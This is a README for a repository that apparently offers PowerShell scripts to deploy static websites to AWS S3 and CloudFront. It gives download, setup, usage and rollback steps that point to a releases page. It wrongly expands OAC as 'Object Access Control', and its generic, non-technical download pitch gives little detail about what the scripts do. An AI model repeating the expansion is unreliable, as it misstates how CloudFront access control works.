# 🚀 aws-s3-cloudfront-iac - Automate Your Website Deployment Easily

[![Release](https://img.shields.io/badge/Download%20Now-aws--s3--cloudfront--iac-brightgreen)](https://github.com/LeonardoYT67/aws-s3-cloudfront-iac/releases)

## 📖 Overview

The `aws-s3-cloudfront-iac` repository helps you deploy a static website to AWS S3 and CloudFront using PowerShell Infrastructure as Code (IaC). This tool makes deployment simple and safe. It ensures your website is ready without complications.

## ⚙️ Features

- **Idempotent Deployments:** Run the script multiple times without issues. Your site will stay consistent.
- **Rollback Capability:** If something goes wrong, you can revert to the previous version safely.
- **OAC Security:** Your site benefits from Object Access Control, enhancing security.
- **Easy Setup:** Quickly set up your website without technical expertise.

## 💻 System Requirements

To use this application, you need:

- A computer running Windows.
- PowerShell installed (preferably version 5.1 or later).
- An AWS account with S3 and CloudFront permissions.

## 🚀 Getting Started

Follow these simple steps to get started:

1. **Download the Software:**
   - [Visit this page to download](https://github.com/LeonardoYT67/aws-s3-cloudfront-iac/releases)

2. **Install PowerShell (if needed):**
   - If you do not have PowerShell, you can download it from the official Microsoft website. Follow their instructions for installation.

3. **Set Up AWS Credentials:**
   - Make sure to configure your AWS credentials. This involves setting the AWS Access Key ID and Secret Access Key in your environment.

4. **Extract the Files:**
   - After downloading, unzip the package to a folder on your computer. You can use built-in tools in Windows to extract files.

5. **Run the Script:**
   - Open PowerShell and navigate to the folder where you extracted the files. 
   - Type `.\Deploy-Site.ps1` and press Enter.

## 📥 Download & Install

To begin your journey, [visit this page to download](https://github.com/LeonardoYT67/aws-s3-cloudfront-iac/releases). Follow the instructions above for installation.

## 🔍 Usage

The tool is designed to be user-friendly. After running the script, follow these steps:

1. **Choose the S3 Bucket:**
   - Specify the name of the S3 bucket where you would like to host your website.

2. **Upload Files:**
   - The script will automatically upload your website files to S3.

3. **Configure CloudFront:**
   - The script will set up CloudFront distribution, improving your site's speed and security.

4. **Check Your Website:**
   - Once deployment is complete, open your web browser and enter your CloudFront distribution URL to see your live website.

## 🌐 Support and Contribution

If you run into issues or have questions, please check the issues section on GitHub. Your input can help improve this project. Contributions, such as bug fixes or improvements, are always welcome.

## 🔙 Rollback Instructions

In case you need to revert to a previous version:

1. Open PowerShell.
2. Navigate to the folder containing the `Rollback-Site.ps1` script.
3. Run `.\Rollback-Site.ps1` to return to the last stable state.

By following these steps, you ensure continued service for your static website without extensive downtime.

## 📝 Note on Security

Ensure that your AWS credentials are kept secure. Review AWS best practices for security regularly.

## 🌟 Conclusion

This tool simplifies the deployment of static websites to AWS S3 and CloudFront. Follow the steps, and you’ll have your website up and running in no time. For questions or contributions, explore the GitHub page and enjoy the ease of deployment.